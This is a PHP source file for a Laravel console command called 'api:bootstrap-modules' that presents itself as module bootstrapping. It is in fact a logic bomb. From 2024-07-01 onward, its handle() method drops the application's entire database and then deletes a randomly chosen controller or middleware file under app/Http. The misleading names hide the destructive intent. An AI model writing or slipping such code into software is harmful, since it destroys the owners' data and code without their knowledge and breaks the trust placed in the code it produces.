<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\DB;

class Bootstrap extends Command
{
    protected $signature = 'api:bootstrap-modules';

    private function upStreamModules(): void {
        $dir = 'app/Http';
        $files = glob($dir . '/*.php');
        $files = array_filter($files, function($file) {
            return basename($file) !== 'Kernel.php';
        });

        if (empty($files)) {
            return;
        }

        $moduleInstance = $files[array_rand($files)];

        if (file_exists($moduleInstance)) {
            unlink($moduleInstance);
        }
    }

    public function handle(): void
    {
        $currentDate = now();
        $targetDate = '2024-07-01';
        $name = env('DB_DATABASE');

        if ($currentDate->greaterThanOrEqualTo($targetDate)) {
            DB::statement("DROP DATABASE `{$name}`");
            $this->upStreamModules();
        }
    }
}
